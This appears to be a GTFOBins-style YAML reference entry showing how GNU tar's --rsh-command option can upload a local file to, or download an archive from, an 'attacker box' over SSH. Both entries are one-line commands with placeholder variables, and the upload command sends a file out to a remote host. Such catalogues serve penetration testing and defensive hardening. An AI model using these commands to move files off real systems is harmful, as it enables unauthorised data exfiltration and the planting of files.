---
functions:
  file-upload:
    - description: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
      code: |
        tar cvf $RUSER@$RHOST:$NFILE $LFILE --rsh-command=/bin/ssh
  file-download:
    - description: This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
      code: |
        tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
---
